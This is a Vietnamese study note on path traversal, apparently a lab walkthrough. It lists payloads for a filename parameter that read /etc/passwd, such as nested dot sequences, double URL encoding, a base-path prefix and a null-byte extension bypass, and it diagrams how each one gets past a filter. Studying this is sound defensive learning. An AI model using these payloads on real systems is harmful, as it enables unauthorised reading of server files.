---
layout: post
title: "Path traversal"
render_with_liquid: false
categories:
  - Common Injection
tags:
  - path-traversal
source_collection: notion
---
Created by: Nguyễn Giang Nam
Topics: Server-side

Sửa đổi `filename` thành

```jsx
../../../etc/passwd
```

Phản hồi chứa giá trị của /etc/passwd

Sửa đổi `filename` thành đường dẫn tuyệt đối

```jsx
/etc/passwd
```

Phản hồi chứa giá trị của /etc/passwd

Sửa đổi `filename` thành

```jsx
....//....//....//etc/passwd
```

Vì ứng dụng sẽ xóa bỏ chuỗi `../` ra khỏi input của user

Sửa đổi `filename` thành

```jsx
..%252f..%252f..%252fetc/passwd
```

```jsx
┌──────────┐                                        ┌─────────┐
│ Attacker │                                        │ Server  │
└────┬─────┘                                        └────┬────┘
     │                                                   │
     │  Test 1: ../../../etc/passwd                      │
     │──────────────────────────────────────────────────>│
     │                                    Filter: "../" found
     │   400 Bad Request                      → BLOCKED  │
     │<──────────────────────────────────────────────────│
     │                                                   │
     │  Test 2: ..%2f..%2f..%2fetc/passwd                │
     │──────────────────────────────────────────────────>│
     │                         ┌─────────────────────────┴─────┐
     │                         │ Web server auto decode:       │
     │                         │ %2f → /                       │
     │                         │ Result: ../../../etc/passwd   │
     │                         │                               │
     │                         │ Filter: "../" found → BLOCKED │
     │                         └─────────────────────────┬─────┘
     │   400 Bad Request                                 │
     │<──────────────────────────────────────────────────│
     │                                                   │
     │  Test 3: ..%252f..%252f..%252fetc/passwd  ← BYPASS│
     │──────────────────────────────────────────────────>│
     │                         ┌─────────────────────────┴─────┐
     │                         │ Web server decode lần 1:      │
     │                         │ %25 → %                       │
     │                         │ Result: ..%2f..%2f..%2fetc/passwd
     │                         │                               │
     │                         │ Filter: No "../" → PASS ✓     │
     │                         │                               │
     │                         │ App decode lần 2:             │
     │                         │ %2f → /                       │
     │                         │ Result: ../../../etc/passwd   │
     │                         │                               │
     │                         │ Read file: /etc/passwd        │
     │                         └─────────────────────────┬─────┘
     │                                                   │
     │   200 OK                                          │
     │   root:x:0:0:root:/root:/bin/bash                 │
     │<──────────────────────────────────────────────────│
     ▼                                                   ▼
```

Sửa đổi `filename` thành

```jsx
/var/www/images/../../../etc/passwd
```

Sửa đổi `filename` thành

```jsx
../../../etc/passwd%00.png
```

```jsx
┌──────────┐                                           ┌─────────┐
│ Attacker │                                           │ Server  │
└────┬─────┘                                           └────┬────┘
     │                                                      │
     │  Test 1: ../../../etc/passwd                         │
     │─────────────────────────────────────────────────────>│
     │                                   ┌──────────────────┴─────┐
     │                                   │ Validate: ends with    │
     │                                   │ .png/.jpg ?            │
     │                                   │ → NO → BLOCKED         │
     │                                   └──────────────────┬─────┘
     │   400 Bad Request                                    │
     │<─────────────────────────────────────────────────────│
     │                                                      │
     │  Test 2: ../../../etc/passwd.png                     │
     │─────────────────────────────────────────────────────>│
     │                                   │ Validate: .png → PASS  │
     │                                   │ Read: .../passwd.png   │
     │                                   │ → File not found       │
     │   404 Not Found                                      │
     │<─────────────────────────────────────────────────────│
     │                                                      │
     │  Test 3: ../../../etc/passwd%00.png         ← BYPASS │
     │─────────────────────────────────────────────────────>│
     │                                   ┌──────────────────┴─────┐
     │                                   │                        │
     │                                   │ [Application Layer]    │
     │                                   │ String: "...passwd\x00.png"
     │                                   │ endsWith(".png") → TRUE│
     │                                   │ → PASS ✓               │
     │                                   │                        │
     │                                   │ [File System Layer]    │
     │                                   │ C reads until \x00     │
     │                                   │ Path: ../../../etc/passwd
     │                                   │ (phần sau \x00 bị bỏ)  │
     │                                   │                        │
     │                                   │ Read: /etc/passwd      │
     │                                   └──────────────────┬─────┘
     │                                                      │
     │   200 OK                                             │
     │   root:x:0:0:root:/root:/bin/bash                    │
     │<─────────────────────────────────────────────────────│
     ▼                                                      ▼
```
